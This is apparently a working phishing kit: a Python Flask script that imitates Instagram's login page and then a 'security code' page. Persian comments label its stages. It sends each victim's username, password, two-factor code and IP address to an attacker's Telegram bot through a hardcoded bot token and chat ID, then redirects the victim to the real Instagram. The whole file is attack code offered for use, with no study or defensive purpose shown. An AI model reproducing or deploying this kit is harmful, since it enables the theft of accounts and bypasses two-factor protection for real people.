import requests
from flask import Flask, request

BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
CHAT_ID   = "2028533085"

app = Flask(__name__)

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=5,
        )
    except:
        pass

# ====== صفحه اول: یوزر و پسورد ======
html_login = """
<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
h1 { font-family: 'Billabong', cursive, serif; font-size: 45px; margin-bottom: 30px; color: #262626; font-weight: normal; }
input { width: 100%; padding: 10px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; outline: none; }
input:focus { border-color: #a8a8a8; }
button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
.divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
.divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
.divider span { padding: 0 18px; }
.fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: block; margin-bottom: 12px; }
.forgot { color: #00376b; font-size: 12px; text-decoration: none; display: block; }
</style>
</head>
<body>
<div class="box">
<h1>Instagram</h1>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
<div class="divider"><span>OR</span></div>
<a href="#" class="fb-login">Log in with Facebook</a>
<a href="#" class="forgot">Forgot password?</a>
</div>
</body>
</html>
"""

# ====== صفحه دوم: کد دو مرحله‌ای (2FA) ======
html_2fa = """
<!DOCTYPE html>
<html>
<head>
<title>Security Code</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
h2 { font-size: 20px; color: #262626; margin-bottom: 10px; }
p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
input { width: 100%; padding: 10px 8px; margin-bottom: 15px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 5px; outline: none; }
button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
</style>
</head>
<body>
<div class="box">
<h2>Enter Security Code</h2>
<p>Please check your phone for a text message with your security code. Enter the 6-digit code below.</p>
<form method="POST" action="/verify">
<input type="text" name="code" placeholder="6-digit code" maxlength="6" required>
<button type="submit">Confirm</button>
</form>
</div>
</body>
</html>
"""

@app.route("/")
def home():
    return html_login

@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("username", "")
    p = request.form.get("password", "")
    ip = request.remote_addr

    # ارسال مرحله اول به تلگرام
    send_telegram(
        f"🎯 **مرحله اول (یوزر/پسورد)**\n\n"
        f"👤 Username: {u}\n"
        f"🔑 Password: {p}\n"
        f"🌐 IP: {ip}"
    )

    # رفتن به صفحه کد دو مرحله‌ای
    return html_2fa

@app.route("/verify", methods=["POST"])
def verify():
    code = request.form.get("code", "")
    ip = request.remote_addr

    # ارسال مرحله دوم (کد) به تلگرام
    send_telegram(
        f"🔐 **مرحله دوم (کد 2FA)**\n\n"
        f"🔢 Code: {code}\n"
        f"🌐 IP: {ip}"
    )

    # هدایت به اینستاگرام واقعی
    return '<script>window.location.href="https://www.instagram.com"</script>'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
